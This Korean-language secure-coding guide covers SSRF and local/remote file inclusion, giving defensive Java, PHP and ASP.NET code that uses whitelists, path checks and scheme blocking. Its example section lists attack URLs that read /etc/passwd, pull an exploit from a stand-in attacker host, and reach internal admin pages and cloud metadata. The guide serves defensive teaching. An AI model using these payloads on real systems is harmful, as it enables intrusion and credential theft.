# 1-4. SSRF / File Inclusion 공격 가능성

> URI 구조에서 사용되는 파라미터(경로) 값의 검증 부재로 발생하는 취약점.  
> 로컬 파일 열람, 원격 악성코드 실행, 내부 시스템 비정상 접근, 원격코드 실행 등이 가능함.

---

## 1. File Inclusion (LFI / RFI)

### 근본적인 원인
웹 애플리케이션이 사용자로부터 전달받은 파라미터 값(파일 경로)을 별도 검증 없이 파일 include/읽기에 사용할 때, 공격자가 경로 조작 문자(`../`)나 외부 URL을 삽입하여 의도하지 않은 파일을 실행·열람함.

```
LFI 예제:
http://www.test.com/vulnerable?errorPath=../../../../etc/passwd

RFI 예제:
http://www.test.com/vulnerable?errorPath=http://vulnerability.com/exploit
```

### 2차 피해 시나리오
- **LFI**: 서버 설정 파일, 소스코드, 개인정보 파일 열람
- **LFI + 웹쉘**: 업로드된 악성 파일을 include하여 원격 코드 실행
- **RFI**: 외부 악성 서버의 스크립트를 불러와 서버에서 실행 → 서버 장악
- NULL 메타문자(`%00`) 우회로 파일 확장자 제한 우회

### 해결 및 대응방안

**① 경로 파라미터 사용 금지 → 인덱스·UUID로 대체 (근본 해결)**

```java
// 취약: 파라미터 경로를 그대로 사용
String path = request.getParameter("errorPath");
mav.setViewName(path);

// 안전: 화이트리스트 방식으로 정의된 경로만 허용
String errorPath = "/error/error.do";  // 서버 측에서 고정
mav.setViewName(errorPath);
```

```java
// 파일 식별자 → 인덱스나 UUID로 전달, 서버에서 경로 매핑
Map<String, String> fileMap = Map.of(
    "report01", "/reports/q1_report.pdf",
    "guide01",  "/guides/user_guide.pdf"
);
String key = request.getParameter("fileKey");
String filePath = fileMap.get(key);
if (filePath == null) {
    response.sendError(400, "Invalid file key");
    return;
}
```

**② Path Traversal 문자 검증**

```java
// ../, ..\, %00 등 경로 조작 문자 차단
String param = request.getParameter("path");
if (param != null && (param.contains("..") || param.contains("%00") || param.contains("\0"))) {
    response.sendError(400, "Invalid path");
    return;
}
// Canonical path 비교로 이중 인코딩 우회 차단
File file = new File(BASE_DIR, param);
if (!file.getCanonicalPath().startsWith(BASE_DIR)) {
    response.sendError(403, "Access denied");
    return;
}
```

**③ PHP: include() 사용 시 화이트리스트 + 원격 포함 비활성화**

```php
// php.ini 설정: 원격 파일 포함 차단
// allow_url_fopen = Off
// allow_url_include = Off

// 화이트리스트 방식으로만 허용
<?php
$white_list_file_inclusion = array('/templates/header.php', '/templates/footer.php');
$file_inclusion = $_GET['file_inclusion'];

if (in_array($file_inclusion, $white_list_file_inclusion)) {
    include($file_inclusion);
} else {
    echo "ERROR\n";
}
?>
```

**④ ASP.NET: 서버 물리 경로 기반 화이트리스트 검증**

```csharp
try {
    string file_inclusion = Request.QueryString["path"];
    string sBasePath = System.Web.HttpContext.Current.Request
                             .ServerVariables["APPL_PHYSICAL_PATH"];
    if (sBasePath.EndsWith("\\"))
        sBasePath = sBasePath.Substring(0, sBasePath.Length - 1);
    sBasePath = sBasePath + "\\" + ConfigurationManager.AppSettings["FilesPath"]
              + "\\" + file_inclusion;

    if (File.Exists(sBasePath)) {
        switch (file_inclusion) {
            case "허용파일1.pdf":
                Response.AddHeader("content-disposition",
                    string.Format("attachment;filename={0}", file_inclusion));
                break;
            case "허용파일2.xlsx":
                Response.AddHeader("content-disposition",
                    string.Format("attachment;filename={0}", file_inclusion));
                break;
            default:
                Response.Redirect("~/Error.aspx");
                return;
        }
    }
    Response.WriteFile(sBasePath);
} catch (Exception ex) {
    Response.Redirect("~/Error.aspx");
}
```

### 보완방안
- 파일 다운로드 기능: 파일 ID(DB PK)로 경로를 서버에서 조회하고 반환
- Base64 인코딩된 경로 파라미터도 복호화 후 동일하게 검증 필수

## 2. SSRF (Server Side Request Forgery)

### 근본적인 원인
서버가 사용자 입력값(URL, IP)을 받아 외부 또는 내부 서비스에 요청을 전달할 때, 검증 없이 조작된 주소로 요청을 수행하면 공격자가 서버를 프록시로 활용하여 내부 시스템에 접근함.

가이드라인 SSRF 공격 예시:
```
http://skshieldus.com/?url=http://192.168.x.x/security     → 내부망 직접 접근
http://skshieldus.com/?url=http://localhost/admin           → 외부 차단된 관리자 페이지 접근
http://skshieldus.com/?url=http://skshieldus.com@http://192.168.x.x/security
                                                            → 도메인 검증 우회
http://skshieldus.com/?url=https://bit.ly/kalskj3Ed         → 단축 URL 우회
http://skshieldus.com/?url=http://www.hacker.com/Exploit.htm → 외부 도메인 공격
http://skshieldus.com/?url=file:///etc/passwd              → 서버 내 파일 열람
```

### 2차 피해 시나리오
- 외부에서 차단된 내부 관리자 페이지 접근
- 내부망 서비스(DB, Redis, 메타데이터 서버) 탐색 및 접근
- AWS/GCP 인스턴스 메타데이터(`169.254.169.254`) 접근으로 임시 자격증명 탈취
- `file://` 스킴으로 서버 내 민감 파일(`/etc/passwd`, AWS credentials) 열람
- 내부 서비스 대상 포트 스캐닝

### 해결 및 대응방안

**① 화이트리스트 방식 URL 검증 (Java)**

```java
import java.util.regex.*;
import org.apache.commons.validator.routines.*;

public class SSRFPrevention {

    static String[] WHITE_LIST = {"1.1.1.1", "2.2.2.2", "skshieldus.com", "infosec.com"};

    public static boolean isSafeUrl(String inputData) {
        // 1. URL 형식 검증 (http/https만 허용)
        String regex = "^(https?):\\/\\/([^:\\/\\s]+)(:([^\\/]*))?((\\/[^\\s\\/]+)*)?\\/?([^#\\s\\?]*)(\\?([^#\\s]*))?(#(\\w*))?$";
        Pattern p = Pattern.compile(regex);
        Matcher mc = p.matcher(inputData);

        if (!mc.matches()) return false;

        String host = mc.group(2);
        InetAddressValidator ipValidator = InetAddressValidator.getInstance();
        DomainValidator domainValidator  = DomainValidator.getInstance();

        // 2. IP 형식인 경우 화이트리스트 IP 확인
        if (ipValidator.isValid(host)) {
            for (String allowed : WHITE_LIST) {
                if (host.equals(allowed)) return true;
            }
            return false;
        }

        // 3. 도메인 형식인 경우 화이트리스트 도메인 확인
        if (domainValidator.isValid(host)) {
            for (String allowed : WHITE_LIST) {
                if (host.equals(allowed)) return true;
            }
        }

        return false;
    }
}
```

**② 위험 URL Scheme 차단**

```java
// file://, dict://, gopher://, ftp:// 등 비HTTP 스킴 거부
String url = request.getParameter("url");
if (url != null) {
    String lower = url.toLowerCase().trim();
    if (lower.startsWith("file://") || lower.startsWith("dict://")
            || lower.startsWith("gopher://") || lower.startsWith("ftp://")) {
        response.sendError(400, "Disallowed URL scheme");
        return;
    }
}
```

**③ 내부 IP 대역 차단**

```java
// 사설 IP 및 루프백 차단
URL parsed = new URL(inputUrl);
InetAddress addr = InetAddress.getByName(parsed.getHost());
if (addr.isLoopbackAddress() || addr.isSiteLocalAddress()
        || addr.isLinkLocalAddress() || addr.isAnyLocalAddress()) {
    throw new SecurityException("Internal address blocked");
}
```

**④ 서버 측 아웃바운드 네트워크 제한**

- 웹 서버에서 외부로 나가는 HTTP 요청 대상을 방화벽으로 화이트리스트 허용 IP/포트만 오픈
- 클라우드 환경: 메타데이터 서버(`169.254.169.254`) 접근을 IMDSv2 전환 또는 네트워크 정책으로 차단

### 보완방안
- 단축 URL 입력 차단 (최종 목적지를 사전 확인할 수 없으므로 허용 금지)
- URL 리다이렉트 발생 시 최종 리다이렉트 대상도 화이트리스트 재검증
- Burp Collaborator / interactsh 등으로 DNS Rebinding 기반 SSRF 탐지 테스트

## 공통 대응 원칙 요약

| 취약점 | 핵심 대응 | 보조 대응 |
|--------|----------|----------|
| LFI | 경로 파라미터 사용 금지 → 인덱스·UUID 매핑 | `../`, `%00` 필터링, Canonical path 비교 |
| RFI | `allow_url_include=Off`, 화이트리스트 | PHP ini 설정 |
| SSRF | URL 화이트리스트 검증, 위험 스킴 차단 | 내부 IP 차단, 아웃바운드 방화벽 정책 |
